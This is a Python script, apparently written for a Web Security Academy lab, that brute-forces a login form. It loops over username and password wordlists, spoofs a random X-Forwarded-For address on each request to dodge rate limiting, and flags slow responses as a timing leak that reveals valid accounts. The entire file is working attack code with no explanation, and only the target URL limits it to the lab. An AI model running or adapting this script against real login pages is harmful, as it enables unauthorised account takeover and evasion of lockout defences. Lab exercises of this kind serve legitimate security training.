

import requests
import time
import random


fd = open('usernames.txt','r')
wordlist = fd.read()
fd.close()

usernames = list(wordlist.split('\n'))
#print(usernames)

fd = open('passwords.txt','r')
wordlist = fd.read()
fd.close()

passwords = list(wordlist.split('\n'))
#print(passwords)



url = "https://ac661f891ea7b15180815f9700fd004b.web-security-academy.net/login"

#username=admin&password=admin

headers2 = {
	"X-Forwarded-For":"127.{}.{}.{}".format(random.randint(1,255),random.randint(1,255),random.randint(1,255))
}

data2 = {
	"username":"wiener2",
	"password":"peter2"
}

t1 = time.perf_counter()
r = requests.post(url,data=data2,headers=headers2)
t2 = time.perf_counter()

print("Time took is {}".format(t2-t1))

for i in usernames:
	for j in passwords:
		headers2 = {
		"X-Forwarded-For":"127.{}.{}.{}".format(random.randint(1,255),random.randint(1,255),random.randint(1,255))
		}

		data2 = {
			"username":i,
			"password":j
		}

		t1 = time.perf_counter()
		r = requests.post(url,data=data2,headers=headers2)
		t2 = time.perf_counter()

		if t2-t1 >=1.5:
			print("Check these credentials {} : {}".format(i,j))

#print(r.text)
